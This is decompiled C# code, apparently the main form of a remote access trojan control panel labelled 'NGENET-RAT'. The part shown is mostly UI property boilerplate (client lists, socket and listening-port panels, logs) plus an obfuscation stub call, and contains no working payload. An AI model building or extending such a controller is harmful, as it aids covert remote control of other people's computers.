using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using NINGALINET.My;
using NINGALINET.My.Resources;

namespace NINGALINET
{
	// Token: 0x0200000A RID: 10
	[DesignerGenerated]
	public partial class Form1 : Form
	{
		// Token: 0x060000A3 RID: 163 RVA: 0x0000299B File Offset: 0x00000B9B
		[DebuggerNonUserCode]
		static Form1()
		{
			// Note: this type is marked as 'beforefieldinit'.
			Class2.zP7eVJHzSiX6G();
			Form1.__ENCList = new List<WeakReference>();
		}

		// Token: 0x060000A4 RID: 164 RVA: 0x0000980C File Offset: 0x00007A0C
		public Form1()
		{
			Class2.zP7eVJHzSiX6G();
			base..ctor();
			base.Load += new EventHandler(this.Form1_Load);
			base.Resize += new EventHandler(this.Form1_Resize);
			base.Activated += new EventHandler(this.Form1_Activated);
			base.Deactivate += new EventHandler(this.Form1_Deactivate);
			base.FormClosing += new FormClosingEventHandler(this.Form1_FormClosing);
			Form1.__ENCAddToList(this);
			this.updatenoip = false;
			this.headertext = false;
			this.Edition = "3iezW0rld - TurkHacker346 NGENET-RAT ";
			this.USER = "";
			this.PASSWORD = "";
			this.PRS = false;
			this.ULT = false;
			this.updatenews = true;
			this.register = false;
			this.groupdrop = false;
			this.K = 0;
			this.T = 0;
			this.folder = Application.StartupPath + "\\Bin\\";
			this.InitializeComponent();
		}

		// Token: 0x060000A5 RID: 165 RVA: 0x00009920 File Offset: 0x00007B20
		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = Form1.__ENCList;
			checked
			{
				lock (_ENCList)
				{
					if (Form1.__ENCList.Count == Form1.__ENCList.Capacity)
					{
						int num = 0;
						int arg_37_0 = 0;
						int num2 = Form1.__ENCList.Count - 1;
						int num3 = arg_37_0;
						while (true)
						{
							int arg_7D_0 = num3;
							int num4 = num2;
							if (arg_7D_0 > num4)
							{
								break;
							}
							WeakReference weakReference = Form1.__ENCList[num3];
							if (weakReference.IsAlive)
							{
								if (num3 != num)
								{
									Form1.__ENCList[num] = Form1.__ENCList[num3];
								}
								num++;
							}
							num3++;
						}
						Form1.__ENCList.RemoveRange(num, Form1.__ENCList.Count - num);
						Form1.__ENCList.Capacity = Form1.__ENCList.Count;
					}
					Form1.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		// Token: 0x1700003E RID: 62
		// (get) Token: 0x060000A8 RID: 168 RVA: 0x000148BC File Offset: 0x00012ABC
		// (set) Token: 0x060000A9 RID: 169 RVA: 0x000029AC File Offset: 0x00000BAC
		internal virtual SplitContainer SplitContainer1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._SplitContainer1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._SplitContainer1 = value;
			}
		}

		// Token: 0x1700003F RID: 63
		// (get) Token: 0x060000AA RID: 170 RVA: 0x000148D4 File Offset: 0x00012AD4
		// (set) Token: 0x060000AB RID: 171 RVA: 0x000029B5 File Offset: 0x00000BB5
		internal virtual ImageList IMG
		{
			[DebuggerNonUserCode]
			get
			{
				return this._IMG;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._IMG = value;
			}
		}

		// Token: 0x17000040 RID: 64
		// (get) Token: 0x060000AC RID: 172 RVA: 0x000148EC File Offset: 0x00012AEC
		// (set) Token: 0x060000AD RID: 173 RVA: 0x000029BE File Offset: 0x00000BBE
		internal virtual ToolStripMenuItem OpenFolderToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._OpenFolderToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._OpenFolderToolStripMenuItem = value;
			}
		}

		// Token: 0x17000041 RID: 65
		// (get) Token: 0x060000AE RID: 174 RVA: 0x00014904 File Offset: 0x00012B04
		// (set) Token: 0x060000AF RID: 175 RVA: 0x000029C7 File Offset: 0x00000BC7
		internal virtual ToolStripPanel BottomToolStripPanel
		{
			[DebuggerNonUserCode]
			get
			{
				return this._BottomToolStripPanel;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._BottomToolStripPanel = value;
			}
		}

		// Token: 0x17000042 RID: 66
		// (get) Token: 0x060000B0 RID: 176 RVA: 0x0001491C File Offset: 0x00012B1C
		// (set) Token: 0x060000B1 RID: 177 RVA: 0x000029D0 File Offset: 0x00000BD0
		internal virtual ToolStripPanel TopToolStripPanel
		{
			[DebuggerNonUserCode]
			get
			{
				return this._TopToolStripPanel;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._TopToolStripPanel = value;
			}
		}

		// Token: 0x17000043 RID: 67
		// (get) Token: 0x060000B2 RID: 178 RVA: 0x00014934 File Offset: 0x00012B34
		// (set) Token: 0x060000B3 RID: 179 RVA: 0x000029D9 File Offset: 0x00000BD9
		internal virtual ToolStripPanel RightToolStripPanel
		{
			[DebuggerNonUserCode]
			get
			{
				return this._RightToolStripPanel;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._RightToolStripPanel = value;
			}
		}

		// Token: 0x17000044 RID: 68
		// (get) Token: 0x060000B4 RID: 180 RVA: 0x0001494C File Offset: 0x00012B4C
		// (set) Token: 0x060000B5 RID: 181 RVA: 0x000029E2 File Offset: 0x00000BE2
		internal virtual ToolStripPanel LeftToolStripPanel
		{
			[DebuggerNonUserCode]
			get
			{
				return this._LeftToolStripPanel;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._LeftToolStripPanel = value;
			}
		}

		// Token: 0x17000045 RID: 69
		// (get) Token: 0x060000B6 RID: 182 RVA: 0x00014964 File Offset: 0x00012B64
		// (set) Token: 0x060000B7 RID: 183 RVA: 0x000029EB File Offset: 0x00000BEB
		internal virtual ToolStripContentPanel ContentPanel
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ContentPanel;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ContentPanel = value;
			}
		}

		// Token: 0x17000046 RID: 70
		// (get) Token: 0x060000B8 RID: 184 RVA: 0x0001497C File Offset: 0x00012B7C
		// (set) Token: 0x060000B9 RID: 185 RVA: 0x00014994 File Offset: 0x00012B94
		internal virtual PictureBox P1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._P1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.P1_Resize);
				if (this._P1 != null)
				{
					this._P1.Resize -= value2;
				}
				this._P1 = value;
				if (this._P1 != null)
				{
					this._P1.Resize += value2;
				}
			}
		}

		// Token: 0x17000047 RID: 71
		// (get) Token: 0x060000BA RID: 186 RVA: 0x000149EC File Offset: 0x00012BEC
		// (set) Token: 0x060000BB RID: 187 RVA: 0x00014A04 File Offset: 0x00012C04
		internal virtual LV L1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._L1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.L1_SelectedIndexChanged);
				if (this._L1 != null)
				{
					this._L1.SelectedIndexChanged -= value2;
				}
				this._L1 = value;
				if (this._L1 != null)
				{
					this._L1.SelectedIndexChanged += value2;
				}
			}
		}

		// Token: 0x17000048 RID: 72
		// (get) Token: 0x060000BC RID: 188 RVA: 0x00014A5C File Offset: 0x00012C5C
		// (set) Token: 0x060000BD RID: 189 RVA: 0x000029F4 File Offset: 0x00000BF4
		internal virtual ColumnHeader ColumnHeader1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader1 = value;
			}
		}

		// Token: 0x17000049 RID: 73
		// (get) Token: 0x060000BE RID: 190 RVA: 0x00014A74 File Offset: 0x00012C74
		// (set) Token: 0x060000BF RID: 191 RVA: 0x000029FD File Offset: 0x00000BFD
		internal virtual ColumnHeader ColumnHeader2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader2 = value;
			}
		}

		// Token: 0x1700004A RID: 74
		// (get) Token: 0x060000C0 RID: 192 RVA: 0x00014A8C File Offset: 0x00012C8C
		// (set) Token: 0x060000C1 RID: 193 RVA: 0x00002A06 File Offset: 0x00000C06
		internal virtual ColumnHeader ColumnHeader3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader3 = value;
			}
		}

		// Token: 0x1700004B RID: 75
		// (get) Token: 0x060000C2 RID: 194 RVA: 0x00014AA4 File Offset: 0x00012CA4
		// (set) Token: 0x060000C3 RID: 195 RVA: 0x00002A0F File Offset: 0x00000C0F
		internal virtual ColumnHeader ColumnHeader4
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader4;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader4 = value;
			}
		}

		// Token: 0x1700004C RID: 76
		// (get) Token: 0x060000C4 RID: 196 RVA: 0x00014ABC File Offset: 0x00012CBC
		// (set) Token: 0x060000C5 RID: 197 RVA: 0x00002A18 File Offset: 0x00000C18
		internal virtual ColumnHeader ColumnHeader5
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader5;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader5 = value;
			}
		}

		// Token: 0x1700004D RID: 77
		// (get) Token: 0x060000C6 RID: 198 RVA: 0x00014AD4 File Offset: 0x00012CD4
		// (set) Token: 0x060000C7 RID: 199 RVA: 0x00002A21 File Offset: 0x00000C21
		internal virtual ColumnHeader ColumnHeader6
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader6;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader6 = value;
			}
		}

		// Token: 0x1700004E RID: 78
		// (get) Token: 0x060000C8 RID: 200 RVA: 0x00014AEC File Offset: 0x00012CEC
		// (set) Token: 0x060000C9 RID: 201 RVA: 0x00002A2A File Offset: 0x00000C2A
		internal virtual ColumnHeader ColumnHeader7
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader7;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader7 = value;
			}
		}

		// Token: 0x1700004F RID: 79
		// (get) Token: 0x060000CA RID: 202 RVA: 0x00014B04 File Offset: 0x00012D04
		// (set) Token: 0x060000CB RID: 203 RVA: 0x00002A33 File Offset: 0x00000C33
		internal virtual ColumnHeader ColumnHeader8
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader8;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader8 = value;
			}
		}

		// Token: 0x17000050 RID: 80
		// (get) Token: 0x060000CC RID: 204 RVA: 0x00014B1C File Offset: 0x00012D1C
		// (set) Token: 0x060000CD RID: 205 RVA: 0x00002A3C File Offset: 0x00000C3C
		internal virtual ColumnHeader ColumnHeader9
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader9;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader9 = value;
			}
		}

		// Token: 0x17000051 RID: 81
		// (get) Token: 0x060000CE RID: 206 RVA: 0x00014B34 File Offset: 0x00012D34
		// (set) Token: 0x060000CF RID: 207 RVA: 0x00002A45 File Offset: 0x00000C45
		internal virtual ColumnHeader ColumnHeader10
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader10;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader10 = value;
			}
		}

		// Token: 0x17000052 RID: 82
		// (get) Token: 0x060000D0 RID: 208 RVA: 0x00014B4C File Offset: 0x00012D4C
		// (set) Token: 0x060000D1 RID: 209 RVA: 0x00002A4E File Offset: 0x00000C4E
		internal virtual ColumnHeader ColumnHeader11
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader11;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader11 = value;
			}
		}

		// Token: 0x17000053 RID: 83
		// (get) Token: 0x060000D2 RID: 210 RVA: 0x00014B64 File Offset: 0x00012D64
		// (set) Token: 0x060000D3 RID: 211 RVA: 0x00002A57 File Offset: 0x00000C57
		internal virtual PictureBox map
		{
			[DebuggerNonUserCode]
			get
			{
				return this._map;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._map = value;
			}
		}

		// Token: 0x17000054 RID: 84
		// (get) Token: 0x060000D4 RID: 212 RVA: 0x00014B7C File Offset: 0x00012D7C
		// (set) Token: 0x060000D5 RID: 213 RVA: 0x00002A60 File Offset: 0x00000C60
		internal virtual Panel PUSER
		{
			[DebuggerNonUserCode]
			get
			{
				return this._PUSER;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._PUSER = value;
			}
		}

		// Token: 0x17000055 RID: 85
		// (get) Token: 0x060000D6 RID: 214 RVA: 0x00014B94 File Offset: 0x00012D94
		// (set) Token: 0x060000D7 RID: 215 RVA: 0x00002A69 File Offset: 0x00000C69
		internal virtual Panel PLOGS
		{
			[DebuggerNonUserCode]
			get
			{
				return this._PLOGS;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._PLOGS = value;
			}
		}

		// Token: 0x17000056 RID: 86
		// (get) Token: 0x060000D8 RID: 216 RVA: 0x00014BAC File Offset: 0x00012DAC
		// (set) Token: 0x060000D9 RID: 217 RVA: 0x00002A72 File Offset: 0x00000C72
		internal virtual StatusStrip StatusStrip2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._StatusStrip2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._StatusStrip2 = value;
			}
		}

		// Token: 0x17000057 RID: 87
		// (get) Token: 0x060000DA RID: 218 RVA: 0x00014BC4 File Offset: 0x00012DC4
		// (set) Token: 0x060000DB RID: 219 RVA: 0x00002A7B File Offset: 0x00000C7B
		internal virtual ToolStripStatusLabel OL
		{
			[DebuggerNonUserCode]
			get
			{
				return this._OL;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._OL = value;
			}
		}

		// Token: 0x17000058 RID: 88
		// (get) Token: 0x060000DC RID: 220 RVA: 0x00014BDC File Offset: 0x00012DDC
		// (set) Token: 0x060000DD RID: 221 RVA: 0x00002A84 File Offset: 0x00000C84
		internal virtual ToolStripStatusLabel STD
		{
			[DebuggerNonUserCode]
			get
			{
				return this._STD;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._STD = value;
			}
		}

		// Token: 0x17000059 RID: 89
		// (get) Token: 0x060000DE RID: 222 RVA: 0x00014BF4 File Offset: 0x00012DF4
		// (set) Token: 0x060000DF RID: 223 RVA: 0x00002A8D File Offset: 0x00000C8D
		internal virtual ToolStripStatusLabel ToolStripStatusLabel7
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripStatusLabel7;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ToolStripStatusLabel7 = value;
			}
		}

		// Token: 0x1700005A RID: 90
		// (get) Token: 0x060000E0 RID: 224 RVA: 0x00014C0C File Offset: 0x00012E0C
		// (set) Token: 0x060000E1 RID: 225 RVA: 0x00002A96 File Offset: 0x00000C96
		internal virtual Panel Panel3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Panel3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Panel3 = value;
			}
		}

		// Token: 0x1700005B RID: 91
		// (get) Token: 0x060000E2 RID: 226 RVA: 0x00014C24 File Offset: 0x00012E24
		// (set) Token: 0x060000E3 RID: 227 RVA: 0x00002A9F File Offset: 0x00000C9F
		internal virtual Pp1 Pp1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Pp1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Pp1 = value;
			}
		}

		// Token: 0x1700005C RID: 92
		// (get) Token: 0x060000E4 RID: 228 RVA: 0x00014C3C File Offset: 0x00012E3C
		// (set) Token: 0x060000E5 RID: 229 RVA: 0x00002AA8 File Offset: 0x00000CA8
		internal virtual StatusStrip StatusStrip3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._StatusStrip3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._StatusStrip3 = value;
			}
		}

		// Token: 0x1700005D RID: 93
		// (get) Token: 0x060000E6 RID: 230 RVA: 0x00014C54 File Offset: 0x00012E54
		// (set) Token: 0x060000E7 RID: 231 RVA: 0x00002AB1 File Offset: 0x00000CB1
		internal virtual ToolStripStatusLabel SRC
		{
			[DebuggerNonUserCode]
			get
			{
				return this._SRC;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._SRC = value;
			}
		}

		// Token: 0x1700005E RID: 94
		// (get) Token: 0x060000E8 RID: 232 RVA: 0x00014C6C File Offset: 0x00012E6C
		// (set) Token: 0x060000E9 RID: 233 RVA: 0x00002ABA File Offset: 0x00000CBA
		internal virtual ToolStripStatusLabel ToolStripStatusLabel8
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripStatusLabel8;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ToolStripStatusLabel8 = value;
			}
		}

		// Token: 0x1700005F RID: 95
		// (get) Token: 0x060000EA RID: 234 RVA: 0x00014C84 File Offset: 0x00012E84
		// (set) Token: 0x060000EB RID: 235 RVA: 0x00002AC3 File Offset: 0x00000CC3
		internal virtual ToolStripStatusLabel SSNT
		{
			[DebuggerNonUserCode]
			get
			{
				return this._SSNT;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._SSNT = value;
			}
		}

		// Token: 0x17000060 RID: 96
		// (get) Token: 0x060000EC RID: 236 RVA: 0x00014C9C File Offset: 0x00012E9C
		// (set) Token: 0x060000ED RID: 237 RVA: 0x00002ACC File Offset: 0x00000CCC
		internal virtual ToolStripStatusLabel ToolStripStatusLabel10
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripStatusLabel10;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ToolStripStatusLabel10 = value;
			}
		}

		// Token: 0x17000061 RID: 97
		// (get) Token: 0x060000EE RID: 238 RVA: 0x00014CB4 File Offset: 0x00012EB4
		// (set) Token: 0x060000EF RID: 239 RVA: 0x00002AD5 File Offset: 0x00000CD5
		internal virtual ToolStripStatusLabel SCN
		{
			[DebuggerNonUserCode]
			get
			{
				return this._SCN;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._SCN = value;
			}
		}

		// Token: 0x17000062 RID: 98
		// (get) Token: 0x060000F0 RID: 240 RVA: 0x00014CCC File Offset: 0x00012ECC
		// (set) Token: 0x060000F1 RID: 241 RVA: 0x00002ADE File Offset: 0x00000CDE
		internal virtual ImageList ImageButton
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ImageButton;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ImageButton = value;
			}
		}

		// Token: 0x17000063 RID: 99
		// (get) Token: 0x060000F2 RID: 242 RVA: 0x00014CE4 File Offset: 0x00012EE4
		// (set) Token: 0x060000F3 RID: 243 RVA: 0x00002AE7 File Offset: 0x00000CE7
		internal virtual Panel PSOCKET
		{
			[DebuggerNonUserCode]
			get
			{
				return this._PSOCKET;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._PSOCKET = value;
			}
		}

		// Token: 0x17000064 RID: 100
		// (get) Token: 0x060000F4 RID: 244 RVA: 0x00014CFC File Offset: 0x00012EFC
		// (set) Token: 0x060000F5 RID: 245 RVA: 0x00002AF0 File Offset: 0x00000CF0
		internal virtual LV Lv1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Lv1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Lv1 = value;
			}
		}

		// Token: 0x17000065 RID: 101
		// (get) Token: 0x060000F6 RID: 246 RVA: 0x00014D14 File Offset: 0x00012F14
		// (set) Token: 0x060000F7 RID: 247 RVA: 0x00002AF9 File Offset: 0x00000CF9
		internal virtual ColumnHeader ColumnHeader12
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader12;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader12 = value;
			}
		}

		// Token: 0x17000066 RID: 102
		// (get) Token: 0x060000F8 RID: 248 RVA: 0x00014D2C File Offset: 0x00012F2C
		// (set) Token: 0x060000F9 RID: 249 RVA: 0x00002B02 File Offset: 0x00000D02
		internal virtual ColumnHeader ColumnHeader13
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader13;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader13 = value;
			}
		}

		// Token: 0x17000067 RID: 103
		// (get) Token: 0x060000FA RID: 250 RVA: 0x00014D44 File Offset: 0x00012F44
		// (set) Token: 0x060000FB RID: 251 RVA: 0x00002B0B File Offset: 0x00000D0B
		internal virtual ColumnHeader ColumnHeader14
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader14;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader14 = value;
			}
		}

		// Token: 0x17000068 RID: 104
		// (get) Token: 0x060000FC RID: 252 RVA: 0x00014D5C File Offset: 0x00012F5C
		// (set) Token: 0x060000FD RID: 253 RVA: 0x00002B14 File Offset: 0x00000D14
		internal virtual ContextMenuStrip ContextMenuStrip2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ContextMenuStrip2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ContextMenuStrip2 = value;
			}
		}

		// Token: 0x17000069 RID: 105
		// (get) Token: 0x060000FE RID: 254 RVA: 0x00014D74 File Offset: 0x00012F74
		// (set) Token: 0x060000FF RID: 255 RVA: 0x00002B1D File Offset: 0x00000D1D
		internal virtual ToolStripMenuItem AddPortToListenToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._AddPortToListenToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._AddPortToListenToolStripMenuItem = value;
			}
		}

		// Token: 0x1700006A RID: 106
		// (get) Token: 0x06000100 RID: 256 RVA: 0x00014D8C File Offset: 0x00012F8C
		// (set) Token: 0x06000101 RID: 257 RVA: 0x00002B26 File Offset: 0x00000D26
		internal virtual CheckBox SLGS2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._SLGS2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._SLGS2 = value;
			}
		}

		// Token: 0x1700006B RID: 107
		// (get) Token: 0x06000102 RID: 258 RVA: 0x00014DA4 File Offset: 0x00012FA4
		// (set) Token: 0x06000103 RID: 259 RVA: 0x00002B2F File Offset: 0x00000D2F
		internal virtual CheckBox SLGS3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._SLGS3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._SLGS3 = value;
			}
		}

		// Token: 0x1700006C RID: 108
		// (get) Token: 0x06000104 RID: 260 RVA: 0x00014DBC File Offset: 0x00012FBC
		// (set) Token: 0x06000105 RID: 261 RVA: 0x00002B38 File Offset: 0x00000D38
		internal virtual CheckBox SLGS1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._SLGS1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._SLGS1 = value;
			}
		}

		// Token: 0x1700006D RID: 109
		// (get) Token: 0x06000106 RID: 262 RVA: 0x00014DD4 File Offset: 0x00012FD4
		// (set) Token: 0x06000107 RID: 263 RVA: 0x00002B41 File Offset: 0x00000D41
		internal virtual CheckBox SAUT
		{
			[DebuggerNonUserCode]
			get
			{
				return this._SAUT;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._SAUT = value;
			}
		}

		// Token: 0x1700006E RID: 110
		// (get) Token: 0x06000108 RID: 264 RVA: 0x00014DEC File Offset: 0x00012FEC
		// (set) Token: 0x06000109 RID: 265 RVA: 0x00002B4A File Offset: 0x00000D4A
		internal virtual CheckBox SAUT2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._SAUT2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._SAUT2 = value;
			}
		}

		// Token: 0x1700006F RID: 111
		// (get) Token: 0x0600010A RID: 266 RVA: 0x00014E04 File Offset: 0x00013004
		// (set) Token: 0x0600010B RID: 267 RVA: 0x00002B53 File Offset: 0x00000D53
		internal virtual CheckBox SAUT1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._SAUT1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._SAUT1 = value;
			}
		}

		// Token: 0x17000070 RID: 112
		// (get) Token: 0x0600010C RID: 268 RVA: 0x00014E1C File Offset: 0x0001301C
		// (set) Token: 0x0600010D RID: 269 RVA: 0x00002B5C File Offset: 0x00000D5C
		internal virtual CheckBox Snotif2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Snotif2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Snotif2 = value;
			}
		}

		// Token: 0x17000071 RID: 113
		// (get) Token: 0x0600010E RID: 270 RVA: 0x00014E34 File Offset: 0x00013034
		// (set) Token: 0x0600010F RID: 271 RVA: 0x00002B65 File Offset: 0x00000D65
		internal virtual CheckBox Snotif
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Snotif;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Snotif = value;
			}
		}

		// Token: 0x17000072 RID: 114
		// (get) Token: 0x06000110 RID: 272 RVA: 0x00014E4C File Offset: 0x0001304C
		// (set) Token: 0x06000111 RID: 273 RVA: 0x00002B6E File Offset: 0x00000D6E
		internal virtual Label Label6
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label6;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label6 = value;
			}
		}

		// Token: 0x17000073 RID: 115
		// (get) Token: 0x06000112 RID: 274 RVA: 0x00014E64 File Offset: 0x00013064
		// (set) Token: 0x06000113 RID: 275 RVA: 0x00014E7C File Offset: 0x0001307C
		internal virtual NumericUpDown Prefresh
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Prefresh;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Prefresh_ValueChanged);
				if (this._Prefresh != null)
				{
					this._Prefresh.ValueChanged -= value2;
				}
				this._Prefresh = value;
				if (this._Prefresh != null)
				{
					this._Prefresh.ValueChanged += value2;
				}
			}
		}

		// Token: 0x17000074 RID: 116
		// (get) Token: 0x06000114 RID: 276 RVA: 0x00014ED4 File Offset: 0x000130D4
		// (set) Token: 0x06000115 RID: 277 RVA: 0x00002B77 File Offset: 0x00000D77
		internal virtual Label Label5
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label5;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label5 = value;
			}
		}

		// Token: 0x17000075 RID: 117
		// (get) Token: 0x06000116 RID: 278 RVA: 0x00014EEC File Offset: 0x000130EC
		// (set) Token: 0x06000117 RID: 279 RVA: 0x00002B80 File Offset: 0x00000D80
		internal virtual Label Label4
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label4;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label4 = value;
			}
		}

		// Token: 0x17000076 RID: 118
